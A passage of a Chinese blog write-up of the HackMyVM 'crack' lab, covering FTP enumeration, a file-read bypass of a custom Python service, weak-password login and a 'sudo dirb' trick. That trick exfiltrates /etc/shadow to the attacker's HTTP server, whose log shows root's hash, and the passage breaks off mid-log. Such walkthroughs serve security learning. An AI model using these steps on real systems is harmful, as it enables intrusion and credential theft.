  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/hackmyvm/" rel="tag">hackmyvm</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/hydra/" rel="tag">hydra</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E8%B7%AF%E5%BE%84%E5%8A%AB%E6%8C%81/" rel="tag">路径劫持</a></li></ul>

    </footer>
  </div>
  
</article>



  
    <article id="post-crack" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2023/07/27/crack/" class="article-date">
  <time class="dt-published" datetime="2023-07-27T00:05:49.000Z" itemprop="datePublished">2023-07-27</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0/">渗透学习</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2023/07/27/crack/">crack</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[/<span class="type">home</span>/<span class="type">ace</span>]</span><br><span class="line">└─<span class="comment"># nmap -sC -sV -p- 192.168.56.133</span></span><br><span class="line">Starting Nmap <span class="number">7.93</span> ( https://nmap.org ) at <span class="number">2023</span><span class="literal">-07-27</span> <span class="number">08</span>:<span class="number">49</span> CST</span><br><span class="line">Nmap scan report <span class="keyword">for</span> <span class="number">192.168</span>.<span class="number">56.133</span></span><br><span class="line">Host is up (<span class="number">0.0016</span>s latency).</span><br><span class="line">Not shown: <span class="number">65532</span> closed tcp ports (reset)</span><br><span class="line">PORT      STATE SERVICE  VERSION</span><br><span class="line"><span class="number">21</span>/tcp    open  ftp      vsftpd <span class="number">3.0</span>.<span class="number">3</span></span><br><span class="line">| ftp<span class="literal">-anon</span>: Anonymous FTP login allowed (FTP code <span class="number">230</span>)</span><br><span class="line">|_drwxrwxrwx    <span class="number">2</span> <span class="number">0</span>        <span class="number">0</span>            <span class="number">4096</span> Jun <span class="number">07</span> <span class="number">14</span>:<span class="number">40</span> upload [<span class="type">NSE</span>: <span class="type">writeable</span>]</span><br><span class="line">| ftp<span class="literal">-syst</span>: </span><br><span class="line">|   STAT: </span><br><span class="line">| FTP server status:</span><br><span class="line">|      Connected to ::ffff:<span class="number">192.168</span>.<span class="number">56.127</span></span><br><span class="line">|      Logged <span class="keyword">in</span> as ftp</span><br><span class="line">|      <span class="built_in">TYPE</span>: ASCII</span><br><span class="line">|      No session bandwidth limit</span><br><span class="line">|      Session timeout <span class="keyword">in</span> seconds is <span class="number">300</span></span><br><span class="line">|      Control connection is plain text</span><br><span class="line">|      <span class="keyword">Data</span> connections will be plain text</span><br><span class="line">|      At session startup, client count was <span class="number">3</span></span><br><span class="line">|      vsFTPd <span class="number">3.0</span>.<span class="number">3</span> - secure, fast, stable</span><br><span class="line">|_End of status</span><br><span class="line"><span class="number">4200</span>/tcp  open  ssl/http ShellInABox</span><br><span class="line">|_http<span class="literal">-title</span>: Shell <span class="keyword">In</span> A Box</span><br><span class="line">|_ssl<span class="literal">-date</span>: TLS randomness does not represent time</span><br><span class="line">| ssl<span class="literal">-cert</span>: Subject: commonName=crack</span><br><span class="line">| Not valid before: <span class="number">2023</span><span class="literal">-06-07T10</span>:<span class="number">20</span>:<span class="number">13</span></span><br><span class="line">|_Not valid after:  <span class="number">2043</span><span class="literal">-06-02T10</span>:<span class="number">20</span>:<span class="number">13</span></span><br><span class="line"><span class="number">12359</span>/tcp open  unknown</span><br><span class="line">| fingerprint<span class="literal">-strings</span>: </span><br><span class="line">|   GenericLines: </span><br><span class="line">|     File to read:NOFile to read:</span><br><span class="line">|   NULL: </span><br><span class="line">|_    File to read:</span><br><span class="line"><span class="number">1</span> service unrecognized despite returning <span class="keyword">data</span>. <span class="keyword">If</span> you know the service/version, please submit the following fingerprint at https://nmap.org/cgi<span class="literal">-bin</span>/submit.cgi?<span class="built_in">new-service</span> :</span><br><span class="line">SF<span class="literal">-Port12359-TCP</span>:V=<span class="number">7.93</span>%I=<span class="number">7</span>%D=<span class="number">7</span>/<span class="number">27</span>%Time=<span class="number">64</span>C1BF1F%P=x86_64<span class="literal">-pc-linux-gnu</span>%<span class="built_in">r</span>(N</span><br><span class="line">SF:ULL,D,<span class="string">&quot;File\x20to\x20read:&quot;</span>)%<span class="built_in">r</span>(GenericLines,<span class="number">1</span>C,<span class="string">&quot;File\x20to\x20read:NOFi</span></span><br><span class="line"><span class="string">SF:le\x20to\x20read:&quot;</span>);</span><br><span class="line">MAC Address: <span class="number">08</span>:<span class="number">00</span>:<span class="number">27</span>:<span class="number">26</span>:<span class="number">25</span>:<span class="number">3</span>E (Oracle VirtualBox virtual NIC)</span><br><span class="line">Service Info: OS: Unix</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: <span class="number">1</span> IP address (<span class="number">1</span> host up) scanned <span class="keyword">in</span> <span class="number">34.34</span> seconds</span><br></pre></td></tr></table></figure>

<h2 id="2-登录ftp服务"><a href="#2-登录ftp服务" class="headerlink" title="2.登录ftp服务"></a>2.登录ftp服务</h2><p>我们发现ftp存在一个登录账号anonymous,登陆查看一下</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[/<span class="type">home</span>/<span class="type">ace</span>]</span><br><span class="line">└─<span class="comment"># ftp 192.168.56.133                                                                                                               </span></span><br><span class="line">Connected to <span class="number">192.168</span>.<span class="number">56.133</span>.</span><br><span class="line"><span class="number">220</span> (vsFTPd <span class="number">3.0</span>.<span class="number">3</span>)</span><br><span class="line">Name (<span class="number">192.168</span>.<span class="number">56.133</span>:ace): anonymous</span><br><span class="line"><span class="number">331</span> Please specify the password.</span><br><span class="line">Password: </span><br><span class="line"><span class="number">230</span> Login successful.</span><br><span class="line">Remote system <span class="built_in">type</span> is UNIX.</span><br><span class="line"><span class="keyword">Using</span> binary mode to transfer files.</span><br><span class="line">ftp&gt; </span><br></pre></td></tr></table></figure>

<h2 id="3-查看一下存在什么文件"><a href="#3-查看一下存在什么文件" class="headerlink" title="3.查看一下存在什么文件"></a>3.查看一下存在什么文件</h2><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[/<span class="type">home</span>/<span class="type">ace</span>]</span><br><span class="line">└─<span class="comment"># ftp 192.168.56.133</span></span><br><span class="line">Connected to <span class="number">192.168</span>.<span class="number">56.133</span>.</span><br><span class="line"><span class="number">220</span> (vsFTPd <span class="number">3.0</span>.<span class="number">3</span>)</span><br><span class="line">Name (<span class="number">192.168</span>.<span class="number">56.133</span>:ace): anonymous</span><br><span class="line"><span class="number">331</span> Please specify the password.</span><br><span class="line">Password: </span><br><span class="line"><span class="number">230</span> Login successful.</span><br><span class="line">Remote system <span class="built_in">type</span> is UNIX.</span><br><span class="line"><span class="keyword">Using</span> binary mode to transfer files.</span><br><span class="line">ftp&gt; <span class="built_in">ls</span></span><br><span class="line"><span class="number">229</span> Entering Extended Passive Mode (|||<span class="number">46515</span>|)</span><br><span class="line"><span class="number">150</span> Here comes the directory listing.</span><br><span class="line">drwxrwxrwx    <span class="number">2</span> <span class="number">0</span>        <span class="number">0</span>            <span class="number">4096</span> Jun <span class="number">07</span> <span class="number">14</span>:<span class="number">40</span> upload</span><br><span class="line"><span class="number">226</span> Directory send OK.</span><br><span class="line">ftp&gt; <span class="built_in">cd</span> upload</span><br><span class="line"><span class="number">250</span> Directory successfully changed.</span><br><span class="line">ftp&gt; <span class="built_in">ls</span></span><br><span class="line"><span class="number">229</span> Entering Extended Passive Mode (|||<span class="number">31922</span>|)</span><br><span class="line"><span class="number">150</span> Here comes the directory listing.</span><br><span class="line"><span class="literal">-rwxr-xr-x</span>    <span class="number">1</span> <span class="number">1000</span>     <span class="number">1000</span>          <span class="number">849</span> Jun <span class="number">07</span> <span class="number">14</span>:<span class="number">40</span> crack.py</span><br><span class="line"><span class="number">226</span> Directory send OK.</span><br><span class="line">ftp&gt; get crack.py</span><br><span class="line">local: crack.py remote: crack.py</span><br><span class="line"><span class="number">229</span> Entering Extended Passive Mode (|||<span class="number">24898</span>|)</span><br><span class="line"><span class="number">150</span> Opening BINARY mode <span class="keyword">data</span> connection <span class="keyword">for</span> crack.py (<span class="number">849</span> bytes).</span><br><span class="line"><span class="number">100</span>% |*****************************************************************************************************|   <span class="number">849</span>      <span class="number">297.48</span> KiB/s    <span class="number">00</span>:<span class="number">00</span> ETA</span><br><span class="line"><span class="number">226</span> Transfer complete.</span><br><span class="line"><span class="number">849</span> bytes received <span class="keyword">in</span> <span class="number">00</span>:<span class="number">00</span> (<span class="number">140.83</span> KiB/s)</span><br><span class="line">ftp&gt; </span><br></pre></td></tr></table></figure>

<p>打开文件看看：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line">s = socket.socket()</span><br><span class="line">s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, <span class="number">1</span>)</span><br><span class="line">port = <span class="number">12359</span></span><br><span class="line">s.bind((<span class="string">&#x27;&#x27;</span>, port))</span><br><span class="line">s.listen(<span class="number">50</span>)</span><br><span class="line"></span><br><span class="line">c, addr = s.accept()</span><br><span class="line">no = <span class="string">&quot;NO&quot;</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">                c.send(<span class="string">&#x27;File to read:&#x27;</span>.encode())</span><br><span class="line">                data = c.recv(<span class="number">1024</span>)</span><br><span class="line">                file = (<span class="built_in">str</span>(data, <span class="string">&#x27;utf-8&#x27;</span>).strip())</span><br><span class="line">                filename = os.path.basename(file)</span><br><span class="line">                check = <span class="string">&quot;/srv/ftp/upload/&quot;</span>+filename</span><br><span class="line">                <span class="keyword">if</span> os.path.isfile(check) <span class="keyword">and</span> os.path.isfile(file):</span><br><span class="line">                        f = <span class="built_in">open</span>(file,<span class="string">&quot;r&quot;</span>)</span><br><span class="line">                        lines = f.readlines()</span><br><span class="line">                        lines = <span class="built_in">str</span>(lines)</span><br><span class="line">                        lines = lines.encode()</span><br><span class="line">                        c.send(lines)</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                        c.send(no.encode())</span><br><span class="line">        <span class="keyword">except</span> ConnectionResetError:</span><br><span class="line">                <span class="keyword">pass</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>深入分析它似乎是一个在端口 12359 上运行的脚本，这将要求我们提供系统文件，如果该文件也存在于路径 &#x2F;srv&#x2F;ftp&#x2F;upload 中，它将向我们发送系统中现有文件的内容。</p>
<p>写个文件上传试试：</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[/<span class="type">home</span>/<span class="type">ace</span>]</span><br><span class="line">└─<span class="comment"># echo &quot;123&quot; &gt;passwd   </span></span><br></pre></td></tr></table></figure>

<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">ftp&gt; put passwd</span><br><span class="line">local: passwd remote: passwd</span><br><span class="line"><span class="number">229</span> Entering Extended Passive Mode (|||<span class="number">36024</span>|)</span><br><span class="line"><span class="number">150</span> Ok to send <span class="keyword">data</span>.</span><br><span class="line"><span class="number">100</span>% |*****************************************************************************************************|     <span class="number">4</span>       <span class="number">20.45</span> KiB/s    <span class="number">00</span>:<span class="number">00</span> ETA</span><br><span class="line"><span class="number">226</span> Transfer complete.</span><br><span class="line"><span class="number">4</span> bytes sent <span class="keyword">in</span> <span class="number">00</span>:<span class="number">00</span> (<span class="number">0.66</span> KiB/s)</span><br><span class="line">ftp&gt; <span class="built_in">ls</span></span><br><span class="line"><span class="number">229</span> Entering Extended Passive Mode (|||<span class="number">49954</span>|)</span><br><span class="line"><span class="number">150</span> Here comes the directory listing.</span><br><span class="line"><span class="literal">-rwxr-xr-x</span>    <span class="number">1</span> <span class="number">1000</span>     <span class="number">1000</span>          <span class="number">849</span> Jun <span class="number">07</span> <span class="number">14</span>:<span class="number">40</span> crack.py</span><br><span class="line"><span class="literal">-rw-------</span>    <span class="number">1</span> <span class="number">107</span>      <span class="number">114</span>             <span class="number">4</span> Jul <span class="number">27</span> <span class="number">03</span>:<span class="number">43</span> passwd</span><br><span class="line"><span class="number">226</span> Directory send OK.</span><br><span class="line">ftp&gt; </span><br></pre></td></tr></table></figure>

<p>连接一下端口：</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[/<span class="type">home</span>/<span class="type">ace</span>]</span><br><span class="line">└─<span class="comment"># nc 192.168.56.133 12359</span></span><br><span class="line">File to read:/etc/passwd</span><br><span class="line">[<span class="string">&#x27;root:x:0:0:root:/root:/bin/bash\n&#x27;</span>, <span class="string">&#x27;daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\n&#x27;</span>, <span class="string">&#x27;bin:x:2:2:bin:/bin:/usr/sbin/nologin\n&#x27;</span>, <span class="string">&#x27;sys:x:3:3:sys:/dev:/usr/sbin/nologin\n&#x27;</span>, <span class="string">&#x27;sync:x:4:65534:sync:/bin:/bin/sync\n&#x27;</span>, <span class="string">&#x27;games:x:5:60:games:/usr/games:/usr/sbin/nologin\n&#x27;</span>, <span class="string">&#x27;man:x:6:12:man:/var/cache/man:/usr/sbin/nologin\n&#x27;</span>, <span class="string">&#x27;lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin\n&#x27;</span>, <span class="string">&#x27;mail:x:8:8:mail:/var/mail:/usr/sbin/nologin\n&#x27;</span>, <span class="string">&#x27;news:x:9:9:news:/var/spool/news:/usr/sbin/nologin\n&#x27;</span>, <span class="string">&#x27;uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin\n&#x27;</span>, <span class="string">&#x27;proxy:x:13:13:proxy:/bin:/usr/sbin/nologin\n&#x27;</span>, <span class="string">&#x27;www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\n&#x27;</span>, <span class="string">&#x27;backup:x:34:34:backup:/var/backups:/usr/sbin/nologin\n&#x27;</span>, <span class="string">&#x27;list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin\n&#x27;</span>, <span class="string">&#x27;irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin\n&#x27;</span>, <span class="string">&#x27;gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin\n&#x27;</span>, <span class="string">&#x27;nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin\n&#x27;</span>, <span class="string">&#x27;_apt:x:100:65534::/nonexistent:/usr/sbin/nologin\n&#x27;</span>, <span class="string">&#x27;systemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin\n&#x27;</span>, <span class="string">&#x27;systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin\n&#x27;</span>, <span class="string">&#x27;messagebus:x:103:109::/nonexistent:/usr/sbin/nologin\n&#x27;</span>, <span class="string">&#x27;systemd-timesync:x:104:110:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin\n&#x27;</span>, <span class="string">&#x27;sshd:x:105:65534::/run/sshd:/usr/sbin/nologin\n&#x27;</span>, <span class="string">&#x27;cris:x:1000:1000:cris,,,:/home/cris:/bin/bash\n&#x27;</span>, <span class="string">&#x27;systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin\n&#x27;</span>, <span class="string">&#x27;shellinabox:x:106:112:Shell In A Box,,,:/var/lib/shellinabox:/usr/sbin/nologin\n&#x27;</span>, <span class="string">&#x27;ftp:x:107:114:ftp daemon,,,:/srv/ftp:/usr/sbin/nologin\n&#x27;</span>]File to read:</span><br></pre></td></tr></table></figure>

<p>sync说明可以连接：</p>
<p>cris是个可疑用户，用shell in A box连接一下</p>
<p>查看前面的扫描结果，发现存在shellinabox的存在</p>
<h2 id="4-shellinabox登录："><a href="#4-shellinabox登录：" class="headerlink" title="4.shellinabox登录："></a>4.shellinabox登录：</h2><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">crack login: cris                                                                                                                                                                                                              </span><br><span class="line">Password: cris                                                                                                                                                                                                                     </span><br><span class="line">Linux crack <span class="number">5.10</span>.<span class="number">0</span><span class="literal">-23-amd64</span> <span class="comment">#1 SMP Debian 5.10.179-1 (2023-05-12) x86_64                                                                       </span></span><br><span class="line">The programs included with the Debian GNU/Linux system are free software;                                                                                                                                                      </span><br><span class="line">the exact distribution terms <span class="keyword">for</span> each program are described <span class="keyword">in</span> the                                                                   individual files <span class="keyword">in</span> /usr/share/doc/*/copyright.  </span><br><span class="line">Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent                                                                                                                                                              </span><br><span class="line">permitted by applicable law.                                                                                                                                                                                                   </span><br><span class="line">Last login: Wed Jun  <span class="number">7</span> <span class="number">14</span>:<span class="number">39</span>:<span class="number">38</span> CEST <span class="number">2023</span> from <span class="number">192.168</span>.<span class="number">0.100</span> on pts/<span class="number">0</span>                                                                                                                                                          </span><br><span class="line">cris@crack:~<span class="variable">$</span> <span class="built_in">ls</span>                                                                                                                                                                                                               </span><br><span class="line">crack.py  user.txt  ziempre.py</span><br><span class="line">cris@crack:~<span class="variable">$</span> <span class="built_in">cat</span> user.txt                                                                                                                                                                                                     </span><br><span class="line">eG4TUsTBxSFjTOPHMV                                                                                                                                                                                                             </span><br><span class="line">cris@crack:~<span class="variable">$</span>                                                                                                                                                                                                                  </span><br></pre></td></tr></table></figure>



<h2 id="5-sudo-提权"><a href="#5-sudo-提权" class="headerlink" title="5.sudo 提权"></a>5.sudo 提权</h2><p>Dirb 是网站的模糊器，所以我已经可以想象如何利用这一点。我所做的是在我的机器上运行一个带有python的Web服务器，然后尝试使用一些具有特权信息的系统文件作为字典对其进行模糊处理。</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">cris@crack:~<span class="variable">$</span> sudo <span class="literal">-u</span> root /usr/bin/dirb http://<span class="number">192.168</span>.<span class="number">56.127</span>/ /etc/shadow       </span><br><span class="line"><span class="literal">-----------------</span>                                                                            </span><br><span class="line">DIRB v2.<span class="number">22</span>                                                                       </span><br><span class="line">By The Dark Raver                                                                     </span><br><span class="line"><span class="literal">-----------------</span>                </span><br><span class="line">START_TIME: Thu Jul <span class="number">27</span> <span class="number">06</span>:<span class="number">05</span>:<span class="number">15</span> <span class="number">2023</span></span><br><span class="line">URL_BASE: http://<span class="number">192.168</span>.<span class="number">56.127</span>/                                                              </span><br><span class="line">WORDLIST_FILES: /etc/shadow                                            </span><br><span class="line"><span class="literal">-----------------</span>                                            </span><br><span class="line">GENERATED WORDS: <span class="number">28</span>                                                                                   </span><br><span class="line"><span class="literal">----</span> Scanning URL: http://<span class="number">192.168</span>.<span class="number">56.127</span>/ <span class="literal">----</span>                                                                                           </span><br><span class="line"><span class="literal">-----------------</span>                                                                      </span><br><span class="line">END_TIME: Thu Jul <span class="number">27</span> <span class="number">06</span>:<span class="number">05</span>:<span class="number">15</span> <span class="number">2023</span>                                                                          </span><br><span class="line">DOWNLOADED: <span class="number">28</span> - FOUND: <span class="number">0</span>                                                                </span><br><span class="line">cris@crack:~<span class="variable">$</span>                                                                                                                                                                                                                  </span><br></pre></td></tr></table></figure>

<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[/<span class="type">home</span>/<span class="type">ace</span>]</span><br><span class="line">└─<span class="comment"># python -m http.server 80</span></span><br><span class="line">Serving HTTP on <span class="number">0.0</span>.<span class="number">0.0</span> port <span class="number">80</span> (http://<span class="number">0.0</span>.<span class="number">0.0</span>:<span class="number">80</span>/) ...</span><br><span class="line"><span class="number">192.168</span>.<span class="number">56.133</span> - - [<span class="number">27</span>/<span class="type">Jul</span>/<span class="number">2023</span> <span class="number">12</span>:<span class="number">05</span>:<span class="number">16</span>] code <span class="number">404</span>, message File not found</span><br><span class="line"><span class="number">192.168</span>.<span class="number">56.133</span> - - [<span class="number">27</span>/<span class="type">Jul</span>/<span class="number">2023</span> <span class="number">12</span>:<span class="number">05</span>:<span class="number">16</span>] <span class="string">&quot;GET /randomfile1 HTTP/1.1&quot;</span> <span class="number">404</span> -</span><br><span class="line"><span class="number">192.168</span>.<span class="number">56.133</span> - - [<span class="number">27</span>/<span class="type">Jul</span>/<span class="number">2023</span> <span class="number">12</span>:<span class="number">05</span>:<span class="number">16</span>] code <span class="number">404</span>, message File not found</span><br><span class="line"><span class="number">192.168</span>.<span class="number">56.133</span> - - [<span class="number">27</span>/<span class="type">Jul</span>/<span class="number">2023</span> <span class="number">12</span>:<span class="number">05</span>:<span class="number">16</span>] <span class="string">&quot;GET /frand2 HTTP/1.1&quot;</span> <span class="number">404</span> -</span><br><span class="line"><span class="number">192.168</span>.<span class="number">56.133</span> - - [<span class="number">27</span>/<span class="type">Jul</span>/<span class="number">2023</span> <span class="number">12</span>:<span class="number">05</span>:<span class="number">16</span>] code <span class="number">404</span>, message File not found</span><br><span class="line"><span class="number">192.168</span>.<span class="number">56.133</span> - - [<span class="number">27</span>/<span class="type">Jul</span>/<span class="number">2023</span> <span class="number">12</span>:<span class="number">05</span>:<span class="number">16</span>] <span class="string">&quot;GET /root:<span class="variable">$y</span><span class="variable">$j9T</span><span class="variable">$LVT9GIrLdk5L</span>.xns1akJZ1<span class="variable">$wmigJ7er07AT</span>/VwIAuYSZ3j94LOCe8EJHC6d2mlZVo3:19515:0:99999:7::: HTTP/1.1&quot;</span> <span class="number">404</span> -</span><br><span class="line"><span class="number">192.168</span>.<span class="number">56.133</span> - - [<span class="number">27</span>/<span class="type">Jul</span>/<span class="number">2023</span> <span class="number">12</span>:<span class="number">05</span>:<span class="number">16</span>] code <span class="number">404</span>, message File not found</span><br><span class="line"><span class="number">192.168</span>.<span class="number">56.133</span> - - [<span class="number">27</span>/<span class="type">Jul</span>/<span class="number">2023</span> <span class="number">12</span>:<span class="number">05</span>:<span class="number">16</span>] <span class="string">&quot;GET /daemon:*:19515:0:99999:7::: HTTP/1.1&quot;</span> <span class="number">404</span> -</span><br><span class="line"><span class="number">192.168</span>.<span class="number">56.133</span> - - [<span class="number">27</span>/<span class="type">Jul</span>/<span class="number">2023</span> <span class="number">12</span>:<span class="number">05</span>:<span class="number">16</span>] code <span class="number">404</span>, message File not found</span><br><span class="line"><span class="number">192.168</span>.<span class="number">56.133</span> - - [<span class="number">27</span>/<span class="type">Jul</span>/<span class="number">2023</span> <span class="number">12</span>:<span class="number">05</span>:<span class="number">16</span>] <span class="string">&quot;GET /bin:*:19515:0:99999:7::: HTTP/1.1&quot;</span> <span class="number">404</span> -</span><br><span class="line"><span class="number">192.168</span>.<span class="number">56.133</span> - - [<span class="number">27</span>/<span class="type">Jul</span>/<span class="number">2023</span> <span class="number">12</span>:<span class="number">05</span>:<span class="number">16</span>] code <span class="number">404</span>, message File not found</span><br><span class="line"><span class="number">192.168</span>.<span class="number">56.133</span> - - [<span class="number">27</span>/<span class="type">Jul</span>/<span class="number">2023</span> <span class="number">12</span>:<span class="number">05</span>:<span class="number">16</span>] <span class="string">&quot;GET /sys:*:19515:0:99999:7::: HTTP/1.1&quot;</span> <span class="number">404</span> -</span><br><span class="line"><span class="number">192.168</span>.<span class="number">56.133</span> - - [<span class="number">27</span>/<span class="type">Jul</span>/<span class="number">2023</span> <span class="number">12</span>:<span class="number">05</span>:<span class="number">16</span>] code <span class="number">404</span>, message File not found</span><br><span class="line"><span class="number">192.168</span>.<span class="number">56.133</span> - - [<span class="number">27</span>/<span class="type">Jul</span>/<span class="number">2023</span> <span class="number">12</span>:<span class="number">05</span>:<span class="number">16</span>] <span class="string">&quot;GET /sync:*:19515:0:99999:7::: HTTP/1.1&quot;</span> <span class="number">404</span> -</span><br><span class="line"><span class="number">192.168</span>.<span class="number">56.133</span> - - [<span class="number">27</span>/<span class="type">Jul</span>/<span class="number">2023</span> <span class="number">12</span>:<span class="number">05</span>:<span class="number">16</span>] code <span class="number">404</span>, message File not found</span><br><span class="line"><span class="number">192.168</span>.<span class="number">56.133</span> - - [<span class="number">27</span>/<span class="type">Jul</span>/<span class="number">2023</span> <span class="number">12</span>:<span class="number">05</span>:<span class="number">16</span>] <span 